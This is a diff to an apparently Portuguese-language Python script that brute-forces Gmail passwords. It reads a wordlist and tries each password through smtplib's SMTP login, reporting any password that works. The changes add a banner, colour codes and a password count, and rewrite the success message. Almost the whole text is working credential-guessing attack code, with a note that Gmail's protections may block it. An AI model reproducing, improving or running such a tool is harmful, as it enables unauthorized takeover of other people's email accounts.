@@ -8,7 +8,25 @@ import random
 import smtplib
 from os import system
 
+verde = '\033[32m'
+A = '\033[33m'
+AZ = '\033[31m'
+
+def wel():
+   
+   system('clear')
+
+   print  '+=========================================+'
+   print  '|..........' + AZ + '  GMAIL  --  Brute '+A+' ...........| '
+   print  '+-----------------------------------------+\n'
+
+
+wel()
+print(AZ +'!!! O Gmail Tem Protecao contra Brute-Force Entao isso pode nao funcionar!!!\n' + A)
 file_path = raw_input('INSIRA A WORDLIST :')
+pass_file = open(file_path,'r')
+pass_list = pass_file.readlines()
+print('Wordlist tem : ' + str(len(pass_list)) +' senhas')
 def login():
       pass_file = open(file_path,'r')
       pass_list = pass_file.readlines()
@@ -21,17 +39,19 @@ def login():
          print str(i) + '/' + str(len(pass_list))
          try:
             server.login(user_name, password)
-            system('clear')
-            main()
-            print '\n'
-            print '[+] A CONTA JA ERA > :' + password
+            wel()
+            print(verde)
+            print("\n\n[+] Senha Correta ==> {}".format(password))
+            print(A)
+            
             break
          except smtplib.SMTPAuthenticationError as e:
             error = str(e)
             if error[14] == '<':
-               system('clear')
-               main()
-               print '[+] A CONTA JA ERA :' + password
+               wel()
+               print(verde)
+               print("\n\n[+] Senha Correta ==> {}".format(password))
+               print(A)
 
                break
             else:
